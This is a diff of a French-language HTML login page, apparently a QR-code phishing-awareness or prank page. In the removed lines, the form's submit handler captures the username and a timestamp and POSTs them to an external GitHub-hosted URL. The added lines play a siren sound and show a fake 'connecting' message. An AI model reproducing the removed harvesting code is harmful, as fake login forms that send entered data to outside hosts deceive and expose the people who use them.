@@ -59,25 +59,16 @@
         </form>
     </div>
 
+    <!-- Ajout du fichier audio -->
+    <audio id="sirenSound" src="https://www.soundjay.com/button/beep-07.wav"></audio>
+
     <script>
         document.getElementById('loginForm').addEventListener('submit', function(event) {
             event.preventDefault();
 
-            // Capture le nom d'utilisateur et la date/heure actuelle
-            const username = document.getElementById('username').value;
-            const dateTime = new Date().toLocaleString();
-
-            // Prépare les données à stocker
-            const data = `Nom d'utilisateur: ${username}, Date/Heure: ${dateTime}\n`;
-
-            // Envoie les données à un fichier via un endpoint
-            fetch('https://raw.githubusercontent.com/balsmr/Test/main/pageqrcode.txt', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/x-www-form-urlencoded',
-                },
-                body: encodeURIComponent(data)
-            });
+            // Jouer le son de sirène
+            var audio = document.getElementById('sirenSound');
+            audio.play();
 
             // Efface le formulaire et affiche un message
             document.querySelector('.login-container').innerHTML = '<h2>Connexion en cours...</h2>';
